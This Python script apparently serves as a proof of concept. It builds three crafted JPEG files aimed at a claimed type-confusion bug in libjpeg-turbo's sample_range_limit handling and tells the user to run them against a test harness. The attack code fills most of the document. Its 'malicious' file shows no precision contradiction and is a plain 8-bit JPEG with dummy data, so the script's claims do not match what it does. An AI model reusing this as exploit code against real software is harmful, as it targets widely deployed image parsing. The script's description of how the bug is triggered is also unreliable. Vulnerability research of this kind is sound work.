#!/usr/bin/env python3
"""
Craft a malicious JPEG to trigger type confusion in libjpeg-turbo

The vulnerability is in how sample_range_limit pointer is typed:
- Declared as JSAMPLE* (1 byte)
- Can actually point to J12SAMPLE* (2 bytes) or J16SAMPLE* (2 bytes)

Strategy: Create a JPEG where we can manipulate the precision interpretation
"""

import struct
import sys

def write_marker(data, marker, content=b''):
    """Write a JPEG marker with optional content"""
    data.append(0xFF)
    data.append(marker)
    if content:
        length = len(content) + 2
        data.append((length >> 8) & 0xFF)
        data.append(length & 0xFF)
        data.extend(content)

def create_basic_jpeg_8bit():
    """Create a minimal valid 8-bit JPEG"""
    data = bytearray()
    
    # SOI (Start of Image)
    data.extend([0xFF, 0xD8])
    
    # JFIF APP0 marker
    app0_data = bytearray()
    app0_data.extend(b'JFIF\x00')  # Identifier
    app0_data.extend([0x01, 0x01])  # Version 1.1
    app0_data.extend([0x00])        # Density units (none)
    app0_data.extend([0x00, 0x01])  # X density
    app0_data.extend([0x00, 0x01])  # Y density
    app0_data.extend([0x00, 0x00])  # Thumbnail size (0x0)
    write_marker(data, 0xE0, app0_data)
    
    # DQT (Define Quantization Table) - Standard luminance table
    dqt_data = bytearray()
    dqt_data.append(0x00)  # Precision 0 (8-bit), table ID 0
    # Simplified quantization table (64 values)
    for i in range(64):
        dqt_data.append(16)  # Simple constant value
    write_marker(data, 0xDB, dqt_data)
    
    # SOF0 (Start of Frame - Baseline DCT) with 8-bit precision
    sof_data = bytearray()
    sof_data.append(8)      # Data precision: 8 bits
    sof_data.extend([0x00, 0x10])  # Height: 16 pixels
    sof_data.extend([0x00, 0x10])  # Width: 16 pixels
    sof_data.append(1)      # Number of components: 1 (grayscale)
    # Component 1
    sof_data.append(1)      # Component ID
    sof_data.append(0x11)   # Sampling factors (1x1)
    sof_data.append(0)      # Quantization table number
    write_marker(data, 0xC0, sof_data)
    
    # DHT (Define Huffman Table) - Minimal DC table
    dht_dc_data = bytearray()
    dht_dc_data.append(0x00)  # Table class 0 (DC), table ID 0
    # Number of codes of each length (1-16)
    bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
    dht_dc_data.extend(bits)
    # Values
    values = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
    dht_dc_data.extend(values)
    write_marker(data, 0xC4, dht_dc_data)
    
    # DHT (Define Huffman Table) - Minimal AC table
    dht_ac_data = bytearray()
    dht_ac_data.append(0x10)  # Table class 1 (AC), table ID 0
    # Number of codes of each length (1-16)
    bits = [0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d]
    dht_ac_data.extend(bits)
    # Values (simplified)
    values = list(range(0, 162))
    dht_ac_data.extend(values)
    write_marker(data, 0xC4, dht_ac_data)
    
    # SOS (Start of Scan)
    sos_data = bytearray()
    sos_data.append(1)      # Number of components in scan
    # Component 1
    sos_data.append(1)      # Component ID
    sos_data.append(0x00)   # DC/AC table numbers (both 0)
    sos_data.extend([0, 63, 0])  # Start/end of spectral selection, successive approximation
    write_marker(data, 0xDA, sos_data)
    
    # Compressed image data (minimal)
    # Just enough to make it parseable
    data.extend([0xFF, 0xD9])  # EOI (End of Image)
    
    return bytes(data)

def create_malicious_jpeg_type_confusion():
    """
    Create a JPEG that attempts to trigger type confusion
    
    Strategy: Create a JPEG with contradictory precision markers
    or progressive scans that might cause precision reinterpretation
    """
    data = bytearray()
    
    # SOI
    data.extend([0xFF, 0xD8])
    
    # JFIF APP0
    app0_data = bytearray()
    app0_data.extend(b'JFIF\x00')
    app0_data.extend([0x01, 0x01])
    app0_data.extend([0x00])
    app0_data.extend([0x00, 0x01])
    app0_data.extend([0x00, 0x01])
    app0_data.extend([0x00, 0x00])
    write_marker(data, 0xE0, app0_data)
    
    # DQT with 8-bit precision
    dqt_data = bytearray()
    dqt_data.append(0x00)  # 8-bit precision, table 0
    for i in range(64):
        dqt_data.append(16)
    write_marker(data, 0xDB, dqt_data)
    
    # SOF0 with 8-bit precision - This will cause 8-bit allocation
    sof_data = bytearray()
    sof_data.append(8)      # Data precision: 8 bits (TRIGGERS 1-BYTE ALLOCATION)
    sof_data.extend([0x00, 0x20])  # Height: 32
    sof_data.extend([0x00, 0x20])  # Width: 32
    sof_data.append(1)      # Grayscale
    sof_data.append(1)
    sof_data.append(0x11)
    sof_data.append(0)
    write_marker(data, 0xC0, sof_data)
    
    # DHT tables
    dht_dc_data = bytearray()
    dht_dc_data.append(0x00)
    bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
    dht_dc_data.extend(bits)
    values = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
    dht_dc_data.extend(values)
    write_marker(data, 0xC4, dht_dc_data)
    
    dht_ac_data = bytearray()
    dht_ac_data.append(0x10)
    bits = [0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d]
    dht_ac_data.extend(bits)
    values = list(range(0, 162))
    dht_ac_data.extend(values)
    write_marker(data, 0xC4, dht_ac_data)
    
    # SOS
    sos_data = bytearray()
    sos_data.append(1)
    sos_data.append(1)
    sos_data.append(0x00)
    sos_data.extend([0, 63, 0])
    write_marker(data, 0xDA, sos_data)
    
    # Add some compressed data
    # This is just dummy data to make the file valid
    for i in range(100):
        data.append((i * 7) & 0xFF)
        if data[-1] == 0xFF:
            data.append(0x00)  # Stuff bytes
    
    # EOI
    data.extend([0xFF, 0xD9])
    
    return bytes(data)

def create_progressive_jpeg_confusion():
    """
    Create a progressive JPEG with multiple scans
    This might trigger state confusion between scans
    """
    data = bytearray()
    
    # SOI
    data.extend([0xFF, 0xD8])
    
    # JFIF APP0
    app0_data = bytearray()
    app0_data.extend(b'JFIF\x00')
    app0_data.extend([0x01, 0x01, 0x00])
    app0_data.extend([0x00, 0x01, 0x00, 0x01])
    app0_data.extend([0x00, 0x00])
    write_marker(data, 0xE0, app0_data)
    
    # DQT
    dqt_data = bytearray()
    dqt_data.append(0x00)
    for i in range(64):
        dqt_data.append(16)
    write_marker(data, 0xDB, dqt_data)
    
    # SOF2 (Progressive DCT) with 8-bit
    sof_data = bytearray()
    sof_data.append(8)      # 8-bit precision
    sof_data.extend([0x00, 0x10])
    sof_data.extend([0x00, 0x10])
    sof_data.append(1)
    sof_data.append(1)
    sof_data.append(0x11)
    sof_data.append(0)
    write_marker(data, 0xC2, sof_data)  # SOF2 = Progressive
    
    # DHT
    dht_dc_data = bytearray()
    dht_dc_data.append(0x00)
    bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
    dht_dc_data.extend(bits)
    values = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
    dht_dc_data.extend(values)
    write_marker(data, 0xC4, dht_dc_data)
    
    # First SOS (DC coefficient)
    sos_data1 = bytearray()
    sos_data1.append(1)
    sos_data1.append(1)
    sos_data1.append(0x00)
    sos_data1.extend([0, 0, 0])  # DC only
    write_marker(data, 0xDA, sos_data1)
    
    # Some data
    for i in range(50):
        data.append((i * 3) & 0xFF)
        if data[-1] == 0xFF:
            data.append(0x00)
    
    # Second SOS (AC coefficients)
    sos_data2 = bytearray()
    sos_data2.append(1)
    sos_data2.append(1)
    sos_data2.append(0x00)
    sos_data2.extend([1, 63, 0])  # AC coefficients
    write_marker(data, 0xDA, sos_data2)
    
    # More data
    for i in range(50):
        data.append((i * 5) & 0xFF)
        if data[-1] == 0xFF:
            data.append(0x00)
    
    # EOI
    data.extend([0xFF, 0xD9])
    
    return bytes(data)

def main():
    print("Creating crafted JPEG files to trigger type confusion...")
    
    # Create basic 8-bit JPEG
    print("\n[1] Creating basic_8bit.jpg...")
    with open('basic_8bit.jpg', 'wb') as f:
        f.write(create_basic_jpeg_8bit())
    print("    Created basic_8bit.jpg")
    
    # Create malicious JPEG
    print("\n[2] Creating malicious_type_confusion.jpg...")
    with open('malicious_type_confusion.jpg', 'wb') as f:
        f.write(create_malicious_jpeg_type_confusion())
    print("    Created malicious_type_confusion.jpg")
    
    # Create progressive JPEG
    print("\n[3] Creating progressive_confusion.jpg...")
    with open('progressive_confusion.jpg', 'wb') as f:
        f.write(create_progressive_jpeg_confusion())
    print("    Created progressive_confusion.jpg")
    
    print("\n[✓] All test files created!")
    print("\nTest these files with:")
    print("  ./test_type_confusion basic_8bit.jpg")
    print("  ./test_type_confusion malicious_type_confusion.jpg")
    print("  ./test_type_confusion progressive_confusion.jpg")

if __name__ == '__main__':
    main()
